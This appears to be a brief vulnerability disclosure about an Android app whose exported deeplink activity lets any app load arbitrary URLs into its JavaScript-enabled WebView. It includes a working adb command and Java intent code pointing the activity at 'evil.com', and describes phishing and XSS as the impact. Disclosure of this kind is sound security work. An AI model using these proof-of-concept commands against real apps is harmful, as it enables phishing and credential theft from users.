---
layout: default
---

The app can be  launched by any other app because its deeplink activity is `exported=true.`

## Adb exploit

```
adb shell am start -a android.intent.action.VIEW -n com.redacted.android/"com.redacted.activities.DeepLinkActivity" -d "https://evil.com"
```

## Apk Exploit

```
       Intent intent = new Intent();
       intent.setClassName("com.redacted.android","com.redcated.android.activities.DeepLinkActivity");
       intent.setData(Uri.parse("https://evil.com"));
       startActivity(intent);
```

## Impact

The attcker can craft a phishing page and grab the credentails. or can launch a xss attack because the webview has `javascriptenabled(true)`. Most of the case the victim believe it as an legitimate url because it is loading in legititmate vulnerable app

[back](./)
